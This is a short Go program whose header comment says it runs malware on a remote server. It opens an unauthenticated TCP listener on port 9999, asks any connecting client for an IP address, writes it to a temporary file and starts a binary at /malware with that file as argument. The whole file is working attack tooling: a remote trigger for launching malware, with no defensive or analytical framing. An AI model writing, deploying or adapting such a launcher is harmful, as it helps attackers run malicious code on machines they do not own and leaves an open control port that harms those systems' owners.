// This code runs the malware with a specified IP address on the remote server.

package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
)

const PORT = 9999

func handleClient(c net.Conn) {
	defer c.Close()

	c.Write([]byte("Enter IP address to connect to: "))
	buf, err := bufio.NewReader(c).ReadString('\n')
	if err != nil {
		log.Println("Error recieving data:", err)
		return
	}

	tmpFile, err := ioutil.TempFile("/tmp", "*")
	if err != nil {
		c.Write([]byte(fmt.Sprintf("Failed to open tmpFile %v\n", err)))
		return
	}

	if _, err = tmpFile.Write([]byte(buf)); err != nil {
		c.Write([]byte(fmt.Sprintf("Failed to write to tmpFile %v\n", err)))
		tmpFile.Close()
		os.Remove(tmpFile.Name())
		return
	}

	tmpFile.Close()

	cmd := exec.Command("/malware", tmpFile.Name())

	if err = cmd.Start(); err != nil {
		c.Write([]byte("Failed to execute malware.\n"))
		log.Println(err)
	}
}

func main() {
	l, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", PORT))
	if err != nil {
		log.Println("Error setting up tcp connection:", err)
		return
	}

	log.Printf("Server listening on port %d", PORT)

	defer l.Close()

	for {
		c, err := l.Accept()
		if err != nil {
			log.Println("Error accepting connection:", err)
			continue
		}
		go handleClient(c)
	}
}
